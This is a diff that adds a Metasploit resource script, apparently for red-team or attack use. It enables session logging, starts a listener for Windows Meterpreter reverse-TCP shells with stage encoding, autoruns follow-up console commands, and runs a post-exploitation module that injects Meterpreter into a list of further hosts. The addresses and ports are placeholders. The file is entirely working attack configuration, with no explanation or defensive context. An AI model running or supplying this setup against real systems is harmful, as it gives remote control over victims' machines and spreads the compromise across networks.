@@ -1,0 +1,18 @@
+spool /mylog.log
+set consolelogging true
+set loglevel 5
+set sessionlogging true
+set timestampoutput true
+set prompt %T S:%S J:%J
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost X.X.X.X
+set lport YYY
+set exitonsession false
+set enablestageencoding true
+set autorunscript multi_console_command.rb -rc /autosploit
+exploit -j -z
+use post/windows/manage/multi_meterpreter_inject
+set iplist X.X.X.X;X.X.X.X
+set lport YYY
+jobs
